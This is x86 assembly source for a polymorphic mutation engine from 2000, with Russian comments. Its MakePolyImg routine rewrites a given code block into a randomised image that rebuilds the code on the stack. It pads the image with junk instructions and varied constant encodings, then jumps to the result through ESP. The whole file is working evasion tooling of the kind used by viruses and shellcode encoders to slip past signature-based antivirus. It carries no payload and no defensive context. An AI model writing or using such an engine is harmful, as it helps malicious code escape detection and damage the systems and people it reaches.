; V2.2  07.06.2000
;  Добавлено:  
;  jmp esp+x  Теперь управление передается не в начало кода, 
;             а по смещению заданному в EDX  при вызове MakePolyImg 
;  pusha      Сохранение первоначального значения регистров
;  NopsMaxCount и MycopMaxCount задаются как параметры процедуры MakePolyImg
;
include macro.inc
include random.inc
NopsMaxCount  EQU  10  ; Максимальное колличество случайно генерируемых нопов.
MycopMaxCount EQU  8   ; Максимальное колличество случайно генерируемых команд.
                       ; Влияют на коэффициент увеличения кода.
                       ; K(10,10)=8
                       ; K(10,5)=6..7
                       ; K(5,10)=6
                       ; K(5,5)=4..5
                       ; K(5,12)=6
;---------------------------------------------------------------------------
; in  esi= Code
;     edi= Buffer
;     ecx= size of code
;     edx= Entry point offset
;     in stack dd (dw NopsMaxCount, dw MycopMaxCount)
MakePolyImg: push ebp
             mov ebp,esp
             pusha
             push ecx
             add esi,ecx
             shr ecx,2 ; size/4
             push ecx
             sub esi,4
             call GenNops
             mov al,60h    ; pusha
             cld           ;
             stosb         ;
@MakePolyImgL1:
              push ecx
              mov ax,word ptr [ebp+MycopMaxCount]
              call RandEAX
              xchg eax,ecx
              inc ecx
GenMycopLoop:push ecx
             call GenMycop
             pop ecx
             loop GenMycopLoop
             mov ax,05h
             call RandEAX
             xchg ecx,eax
             push esi
             mov  esi,[esi]
             call MakePush0xXXXXXXXX
             pop esi
             pop ecx
             sub esi,4
             loop @MakePolyImgL1
             pop ecx
             pop eax
             shl ecx,2
             sub eax,ecx
             or eax,eax
             je_ @Mod0
             push eax
             mov  esi,[esi]
             call MakePush0xXXXXXXXX
             pop eax
             mov cl,4
             sub al,cl
             neg al
             regEDX EQU 5*4
@Mod0:      add eax,[esp+regEDX]
            call MakeJMP2ESP
             mov eax,[esp]
             sub edi,eax
             mov [esp+1ch],edi
             popa
             pop ebp
             ret  4
ChetHe4et:   call Rand0xFF
             and al,00000001b
             ret
;---------------------------------------------------------------------------
; in  eax=(4-mod(CodeSize/4))  остаток от деления на 4
MakeJMP2ESP: push eax
             call ChetHe4et
             or al,al
             je_ @MakeJMP2ESPL1
             mov al,54h  ;push esp
             cld
             stosb
             call GenNops
             mov dl,58h  ;push eax
             call GenRegF
             add dl,al
             xchg dl,al
             cld
             stosb
             jmp MakeADD_eax_03
@MakeJMP2ESPL1:mov al,08bh    ; mov eax,esp
               cld
               stosb
               call GenRegF
               mov dl,al
               mov cl,al
               mov ch,04
               call opCode_eRg1&eRg2
               cld
               stosb
MakeADD_eax_03:
               call GenNops
               mov al,40h
               add al,dl
               pop ecx
               or ecx,ecx
               je_ @Zero
@MakeADD_eax_03L1:
               cld
               stosb
               call GenNops
               loop @MakeADD_eax_03L1
@Zero:         mov ax,0e0ffh
               add ah,dl
               cld
               stosw
               call GenNops
               ret
;---------------------------------------------------------------------------
GenMycop:  call ChetHe4et
           or al,al
           je_ @GenMycopL1
           mov ax,08h      ; Генерируем команду
           call RandEAX    ;
           shl ax,3  ; *8  ;
           xchg ax,dx      ;
           mov ax,05h      ;
           call RandEAX    ;
           add dx,ax       ;
           xchg dx,ax
           cld
           stosb
           call Gen&SetRegsOpCode
           ret
Gen&SetRegsOpCode:
           call GenReg
           mov cl,al
           call GenReg
           mov ch,al
           call opCode_eRg1&eRg2
           cld
           stosb
           ret
@GenMycopL1: mov dl,84h
             mov ax,08h
             call RandEAX
             add dl,al
             xchg dl,al
             cld
             stosb
             call Gen&SetRegsOpCode
             ret
GenNops:  pusha
          mov ax,word ptr [NopsMaxCount+ebp]
          call RandEAX
@GenNopsL1:
          or ax,ax
          je_ @GenNopsL2
          push eax
          mov ax,3     ;Type of nop
          Call RandEAX ;
          xchg ax,cx   ;
          call GenNop
          pop eax
          dec ax
          jmp @GenNopsL1
@GenNopsL2:
          mov [esp],edi
          popa
          ret
;----------------------------------------------------------------------------
; in ecx=Type of nop (0..2)
;    edi=Dest
GenNop:            and ecx,00000000000000000000000000000011b
                   call @GenNopl1
        @GenNopl2: dw offset case0 - offset @GenNopl2
                   dw offset case1 - offset @GenNopl2
                   dw offset case2 - offset @GenNopl2
                   dw offset ERts - offset @GenNopl2
        @GenNopl1: pop ebx
                   shl ecx,1
                   add bx,word ptr [ebx+ecx]
                   jmp ebx
;-------------------------------------------------------------
case0:             call GenRegF  ;
                   mov cx,05850h
                   add ch,al
                   add cl,al
                   xchg ecx,eax
                   cld
                   stosw
                   ret
;-------------------------------------------------------------
                   db 03bh,085h,086h,0bh,8bh,08Dh,08h,0A3h;
case1:             sub ebx,08
                   call GenRegF
                   mov cl,al
                   call GenRegF
                   mov ch,al
                   mov eax,08h
                   call RandEAX
                   add ebx,eax
                   mov ah,byte ptr [ebx]
                   cmp al,2
                   jl_ @@1
                   cmp al,6
                   jg_ @@1
                   mov cl,ch
@@1:               mov dl,al
                   cmp dl,5
                   jne_ @@3
                   sub al,0c0h     ; lea EAX,[EAX]
                   cmp cl,5
                   jne_ @@4
                   inc cl
              @@4: cmp cl,4
                   jne_ @@5
                   inc cl
                   inc cl
              @@5: cmp ch,5
                   jne_ @@6
                   inc ch
              @@6: cmp ch,4
                   jne_ @@3
                   inc ch
                   inc ch
              @@3: call opCode_eRg1&eRg2
                   cmp dl,5
                   jne_ @@7
                   sub al,0c0h     ; lea EAX,[EAX]
              @@7: xchg al,ah
                   cmp dl,7
                   jl_ @@2
                   push eax
                   mov al,0fh
                   cld
                   stosb
                   pop eax
@@2:               cld
                   stosw
                   ret
case2:             call GenRegF  ;
                   mov cx,04840h
                   add ch,al
                   add cl,al
                   xchg ecx,eax
                   push eax
                   mov  ax,0ffh
                   call RandEAX
                   mov cx,ax
                   pop eax
                   inc ecx
                   @@@1:
                   xchg al,ah
                   loop @@@1
                   cld
                   stosw
ERts:              ret
;----------------------------------------------------------------------------
; in
; cl=eRg1#
; ch=eRg2#
; out
; al=opCode eRg1&eRg2
opCode_eRg1&eRg2:
                 mov al,0c0h
                 shl cl,3
                 add al,cl
                 add al,ch
                 ret
;----------------------------------------------------------------------------
; esi = 0xXXXXXXXX
; edi = Dest
; ecx = Metod# (0..4)
Metod EQU 4
MakePush0xXXXXXXXX:
                   and ecx,00000000000000000000000000000111B
                   cmp cl,5
                   jl_ @g
                   mov cl,4
                 @g:
                   call @l1
              @l2: dw offset Metod1 - offset @l2
                   dw offset Metod2 - offset @l2
                   dw offset Metod3 - offset @l2
                   dw offset Metod4 - offset @l2
                   dw offset Metod4b - offset @l2
              @l1: pop ebx
                  ;mov ecx,Metod
                   shl ecx,1
                   add bx,word ptr [ebx+ecx]
                   jmp ebx
Metod1:
                   mov al,068h    ;  push 0xXXXXXXXX
                   cld            ;
                   stosb          ;
                   xchg eax,esi
                   cld            ;
                   stosd          ;
                   ret
;----------------------------------------------------------------------
Metod2:
                                   ;    mov eRg,0xXXXXXXXX
                  ; call GenReg     ;    push eRg
                  ; call MakeMOVeRg0xXXXXXXXX
                   call Opt2
                   call GenNops
                   call MakePush_eRg
                   ret            ;
;----------------------------------------------------------------------
Metod3:            ;call GenReg
                   ;call MakeMOVeRg0xXXXXXXXX
                   call Opt2
                   shl dl,3       ; Reg#*8
                   call GenReg
                   push eax
                   add dl,al
                   mov ax,0C087h
                   add ah,dl
                   cld
                   stosw
                   pop edx
                   call GenNops
                   call MakePush_eRg
                   ret
Rand0xFF:
                 mov al,0ffh
                 call RandEAX
                 ret
;-------------------------------------------------------------------
Opt1:            call Rand0xFF
                 xchg cl,al
                 ret
Opt2:            call GenReg
                 call MakeMOVeRg0xXXXXXXXX
                 call GenNops
                 ret
Opt3:              add ah,dl
                   cld
                   stosw
                   xchg cl,al
                   cld
                   stosb
                   call GenNops
                   call MakePush_eRg
                   ret
Metod4:            call Opt1
                   ror esi,cl
                   call Opt2

                   mov ax,0C0C1h
                   call Opt3
                   ret
Metod4b:           call Opt1
                   rol esi,cl
                   call Opt2
                   mov ax,0C8C1h
                   call Opt3
                   ret
;-----------------------------------------------

GenRegF:        mov eax,7h     ;
                call  RandEAX  ;
                ret
GenReg:        ; out  al=Reg#
@L:             call GenRegF
                cmp al,4       ;
                je @L          ;
                 ret
MakeMOVeRg0xXXXXXXXX:
                   ; input  al=Reg# (0..7)
                   ;        edi=Dest
                   ;   out  dl=Reg#
                   mov dl,0b8h    ;
                   add dl,al      ;
                   xchg dl,al     ;
                   cld            ;
                   stosb          ;
                   mov eax,esi
                   cld            ;
                   stosd          ;
                   ret
MakePush_eRg:
                   ; input dl=Reg# (0..7)
                   ;      edi=Dest
                   mov al,50h     ;
                   add al,dl      ;
                   cld            ;
                   stosb          ;
                   ret
MakePush0xXXXXXXXXEnd:
